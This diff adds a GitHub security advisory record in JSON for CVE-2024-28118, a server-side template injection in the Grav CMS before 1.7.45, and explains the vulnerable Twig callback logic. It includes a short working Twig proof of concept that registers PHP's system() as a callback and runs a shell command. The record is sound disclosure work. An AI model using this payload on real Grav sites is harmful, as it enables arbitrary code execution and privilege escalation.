@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-r6vw-8v8r-pmp4",
+  "modified": "2024-03-22T16:55:39Z",
+  "published": "2024-03-22T16:55:39Z",
+  "aliases": [
+    "CVE-2024-28118"
+  ],
+  "summary": "Server Side Template Injection (SSTI)",
+  "details": "### Summary\nDue to the unrestricted access to twig extension class from grav context, an attacker can redefine config variable. As a result, attacker can bypass previous patch.\n\n### Details\nThe twig context has a function declared called getFunction.\n```php\npublic function getFunction($name)\n    {\n        if (!$this->extensionInitialized) {\n            $this->initExtensions();\n        }\n\n        if (isset($this->functions[$name])) {\n            return $this->functions[$name];\n        }\n\n        foreach ($this->functions as $pattern => $function) {\n            $pattern = str_replace('\\\\*', '(.*?)', preg_quote($pattern, '#'), $count);\n\n            if ($count) {\n                if (preg_match('#^'.$pattern.'$#', $name, $matches)) {\n                    array_shift($matches);\n                    $function->setArguments($matches);\n\n                    return $function;\n                }\n            }\n        }\n\n        foreach ($this->functionCallbacks as $callback) {\n            if (false !== $function = \\call_user_func($callback, $name)) {\n                return $function;\n            }\n        }\n\n        return false;\n    }\n```\nThis function, if the value of `$name` does not exist in `$this->functions`, uses call_user_func to execute callback functions stored in `$this->functionCallbacks`.\n\nIt is possible to register arbitrary function using registerUndefinedFunctionCallback, but a callback that has already been registered exists and new callbacks added will not be executed.\n\nThe default function callback is as follows:\n```php\n$this->twig->registerUndefinedFunctionCallback(function (string $name) use ($config) {\n                $allowed = $config->get('system.twig.safe_functions');\n                if (is_array($allowed) and in_array($name, $allowed, true) and function_exists($name)) {\n                    return new TwigFunction($name, $name);\n                }\n                if ($config->get('system.twig.undefined_functions')) {\n                    if (function_exists($name)) {\n                        if (!Utils::isDangerousFunction($name)) {\n                            user_error(\"PHP function {$name}() was used as Twig function. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_functions`\", E_USER_DEPRECATED);\n\n                            return new TwigFunction($name, $name);\n                        }\n\n                        /** @var Debugger $debugger */\n                        $debugger = $this->grav['debugger'];\n                        $debugger->addException(new RuntimeException(\"Blocked potentially dangerous PHP function {$name}() being used as Twig function. If you really want to use it, please add it to system configuration: `system.twig.safe_functions`\"));\n                    }\n\n                    return new TwigFunction($name, static function () {});\n                }\n\n                return false;\n            });\n```\nIf you look at this function, if the value of system.twig.undefined_functions is false, it returns false.\nIn that case, it is possible for our registered callback to be executed.\n\nAt this time, the `Grav\\Common\\Config\\Config` class is loaded within the grav context, and access to the set method is allowed, making it possible to set the value of system.twig.undefined_functions to false.\nAs a result, an attacker can execute any arbitrarily registered callback function.\n\n### PoC\n```\n{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}\n{% set a = grav.config.set('system.twig.undefined_functions',false) %}\n{{ grav.twig.twig.getFunction('id') }}\n```\n\n![image](https://user-images.githubusercontent.com/46442697/281371295-25174479-e9ab-40ca-8016-99c51f72d7a8.png)\n\n\n### Impact\nTwig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.45"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-r6vw-8v8r-pmp4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28118"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-22T16:55:39Z",
+    "nvd_published_at": "2024-03-21T22:15:12Z"
+  }
+}
